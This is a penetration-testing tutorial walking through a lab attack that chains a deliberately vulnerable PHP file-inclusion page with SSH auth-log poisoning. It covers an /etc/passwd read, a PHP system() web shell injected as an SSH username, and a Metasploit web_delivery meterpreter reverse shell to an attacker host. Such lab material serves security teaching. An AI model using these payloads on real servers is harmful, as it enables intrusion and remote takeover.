<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">RCE with LFI and SSH Log Poisoning</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" rel="bookmark"><time class="entry-date published" datetime="2017-02-20T07:49:10+00:00">February 20, 2017</time><time class="updated" datetime="2025-06-06T21:35:51+00:00">June 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, you will learn how to make unauthorized access in a web server if it is suffering from local file inclusion vulnerability with help of auth log file. To perform this attack Please read our previous article “<a href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/">Beginner Guide to File Inclusion Attack (LFI/RFI)”</a> and “<a href="https://www.hackingarticles.in/web-server-lab-setup-for-penetration-testing/">Configure Web Server for Penetration Testing (Beginner Guide)”</a> that will help you in the configuration of own web server as well as more about LFI vulnerability.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong>Attacker: Kali Linux</strong></span></p>
<p class="ai-optimize-8"><span style="color: #000000;"><strong>Target: Ubuntu</strong></span></p>
<h3 class="ai-optimize-45"><span style="color: #800000;">Setting Up the Vulnerable Environment</span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<p class="ai-optimize-10"><span style="color: #000000;">Create a PHP file which will allow the user to include a file through a file parameter. Hence using file parameter we can execute a file that contains malicious code to make unauthorized access is target PC. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php
$file = $_GET['file'];
if(isset($file))
{
include("$file");
}
else
{
include("index.php");
}
?&gt;</pre>
<p class="ai-optimize-11"><span style="color: #000000;">I had saved given below PHP code inside a text file as <strong>lfi.php </strong>and saved on the desktop.</span></p>
<p class="ai-optimize-12"><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-73qLTeNl-eg/WcoZWO8B0GI/AAAAAAAARqQ/T1spgC8e98MUS3pECZyJghRNtfFwQR1ygCLcBGAs/s1600/1.1.png" alt="LFI to RCE via SSH Log Poisoning" width="631" height="413"/></span></p>
<p class="ai-optimize-13"><span style="color: #000000;">Now login with the user as “root” and create a folder “lfi” inside /var/www/html</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/html
mkdir lfi</pre>
<p class="ai-optimize-14"><span style="color: #000000;">Move the <strong>lfi.php </strong>file from desktop to /var/www/html using given below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv /home/raj/Desktop/lfi.php .</pre>
<p class="ai-optimize-15"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6QWgFO8eoI8/WcoZXh3FsfI/AAAAAAAARqk/cK51R1ZfhD8y8t1B_Tn5l5_vuRL3gfdrgCLcBGAs/s1600/1.2.png"/></span></p>
<p class="ai-optimize-16"><span style="color: #000000;">Since we had added a php file with include function inside /var/www/html which allow to read the content of another file through it and can lead to LFI attack. Let’s demonstrate it by exploring the following URL to read password files:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">localhost/lfi/lfi.php?file=/etc/passwd</pre>
<p class="ai-optimize-17"><span style="color: #000000;">From the given image you can observe that the above URL has dumped the following result shown below.</span></p>
<p class="ai-optimize-18"><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-aJs-jD3gH4o/WcoZWHwIPaI/AAAAAAAARqM/vwXMyp0BwAwYempPailfu2yhXJBTieYuQCLcBGAs/s1600/1.3.png" alt="LFI to RCE via SSH Log Poisoning" width="662" height="493"/></span></p>
<h3 class="ai-optimize-46"><span style="color: #800000;">Exploiting Auth Logs for Code Execution</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">Open a terminal in your Kali Linux and connect the target through SSH service</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh user@192.168.1.129</pre>
<p class="ai-optimize-20"><span style="color: #000000;">From the screenshot, you can see I am connected with the target system.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7U7nXnmlZ_4/WcoZWsdXF2I/AAAAAAAARqU/ONPWytIuKXYcD-lOe0gBo-5nWDmwBBEMQCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-22"><span style="color: #000000;">Type following command to view its logs:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -f /var/log/auth.log</pre>
<p class="ai-optimize-23"><span style="color: #000000;">From given below image you can check the details of generated logs for the auth.log file.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-f9NiWv4hFHY/WcoZXd6DrfI/AAAAAAAARqg/N1mcwWgD2ToQN_cDkBKQu5hSzfJ1T4b4QCLcBGAs/s1600/2.png" alt="LFI to RCE via SSH Log Poisoning" width="906" height="230"/></span></p>
<p class="ai-optimize-25"><span style="color: #000000;">Now I will try to open auth.log log file through lfi.php on the browser, therefore, give read and write permission to</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/log/
chmod 775 auth.log</pre>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Fy1Hhlv5krg/WcoZXcykVgI/AAAAAAAARqc/_uMnO6igSdYii5hrUiQcDlTGbUnSQkbxgCLcBGAs/s1600/3.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">Now to include the auth.log file as file parameter and give following URL inside the browser.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.129/lfi/lfi.php?file=/var/log/auth.log</pre>
<p class="ai-optimize-28"><span style="color: #000000;">From the given image you can see it is showing created auth logs in the browser also.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CY17T52lKAg/WcoZXwV3n4I/AAAAAAAARqo/m0wMACnK718V-YFaqRokncKIb9RoqDCSwCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-30"><span style="color: #000000;">Since the auth.log file generates a log for every success and failed login attempt when we try to connect with the web server. Taking advantage of this feature now, I will send malicious PHP code as a fake user, and it will automatically add itself in the auth.log file as a new log.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.1.129</pre>
<p class="ai-optimize-31"><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-n_DlqlB-6dM/WcoZX8WJT_I/AAAAAAAARqs/sZXjQmsqLScHgGNi806e_qwTFhrpjK4UgCLcBGAs/s1600/5.png" alt="LFI to RCE via SSH Log Poisoning" width="585" height="100"/></span></p>
<p class="ai-optimize-32"><span style="color: #000000;">Again when you will check its log, you will find the PHP code has been added a new log.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;">Type following command to view its logs:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -f /var/log/auth.log</pre>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-l6bR32UQwjg/WcoZYPyAcrI/AAAAAAAARqw/LOYjSsAFlWEFWlXysGyI0Nf-S86YMMUggCLcBGAs/s1600/6.png"/></span></p>
<h3 class="ai-optimize-47"><span style="color: #800000;">Gaining Meterpreter Access</span></h3>
<p class="ai-optimize-35"><span style="color: #000000;">Here it will dump the data of auth.log as well as execute command given through cmd; now execute<strong> ifconfig</strong> as cmd command to verify network interface and confirm its result from inside the given screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.129/lfi/lfi.php?file=/var/log/auth.log&amp;c=ifconfig</pre>
<p class="ai-optimize-36"><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-rF9EeFqMNbw/WcoZYdO6f7I/AAAAAAAARq0/7BAwWDDiG2g5qt3TSmNazg5J-ReP59jlQCLcBGAs/s1600/7.png" alt="LFI to RCE via SSH Log Poisoning" width="747" height="444"/></span></p>
<p class="ai-optimize-37"><span style="color: #000000;">If you found such kind of vulnerability in any web application then you can use Metasploit platform to exploit web server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
msf exploit (web_delivery)&gt;set target 1
msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp
msf exploit (web_delivery)&gt; set lhost 192.168.1.123
msf exploit (web_delivery)&gt;set srvport 8081
msf exploit (web_delivery)&gt;exploit</pre>
<p class="ai-optimize-38"><span style="color: #000000;"><strong>Copy</strong> the <strong>highlighted text</strong> shown in below window</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uhub1WIcFD4/WcoZYZrlooI/AAAAAAAARq4/D_9ocyUqTU4Om3UYxvl_MaB6zTfyzovdQCLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><strong>Paste the above</strong> copied malicious code inside URL as shown in the given image and <strong>execute</strong> it <strong>as a command.</strong></span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8Q_FLgODNBY/WcoZYk32HbI/AAAAAAAARq8/NitZ3ajGACUqYceKXQPA01CKBVszupZIwCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">When the above code gets executed you will get meterpreter session 1 of the targeted web server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf exploit (web_delivery)&gt;sessions 1
meterpreter&gt; sysinfo</pre>
<p class="ai-optimize-43"><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-m1w1PY8_ZVk/WcoZWhfiEaI/AAAAAAAARqY/uMNtLXtMV-MMmnctaBT64lXYUDBLdtQowCLcBGAs/s1600/10.png" alt="LFI to RCE via SSH Log Poisoning" width="754" height="217"/></span></p>
<p class="ai-optimize-44"><span style="color: #000000;"><strong> Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"> here</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
